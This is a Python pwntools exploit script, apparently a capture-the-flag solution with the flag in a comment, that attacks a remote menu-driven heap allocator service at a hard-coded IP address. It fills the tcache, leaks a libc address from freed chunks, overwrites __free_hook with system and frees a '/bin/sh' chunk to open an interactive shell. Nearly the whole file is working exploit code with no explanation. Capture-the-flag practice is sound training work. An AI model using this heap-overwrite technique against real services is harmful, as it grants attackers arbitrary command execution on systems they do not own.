#flag=TSG{dont_eat_your_pet_fish}
from pwn import *
libc=ELF('./libc.so.6')
target=remote('35.221.81.216',32112)
def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))
def alloc(size,data):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(size))
	print(target.recvuntil(": "))
	target.send(data)
def show(index):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(str(index))
	leak=target.recvline().strip("\n")
	return leak
def free(index):
	init(3)
	print(target.recvuntil(": "))
	target.sendline(str(index))
def dele(size,data):
	init(0)
	print(target.recvuntil("> "))
	target.sendline('y')
	print(target.recvuntil(": "))
	target.sendline(str(size))
	print(target.recvuntil(": "))
	target.send(data)
print(target.recvuntil(": "))
target.sendline('n')
for i in range(8):
	alloc(0x1ff,"/bin/sh\x00")#0-7
alloc(0x6f,"/bin/sh\x00")#8
alloc(0x6f,"/bin/sh\x00")#9
alloc(0x6f,"/bin/sh\x00")#10
for i in range(7):
	alloc(0x1ff,"/bin/sh\x00")#11-17
for i in range(7):
	free(i)
free(10)
free(8)
free(9)
free(7)	
alloc(0x1ff,"\xe0")
libc_leak=u64(show(0)[0:6].ljust(8,"\x00"))
libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x70
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
alloc(0x6f,p64(libc_free_hook))#15
alloc(0x6f,p64(libc_free_hook))#16
dele(0x6f,p64(libc_system))#17
free(11)	
target.interactive()



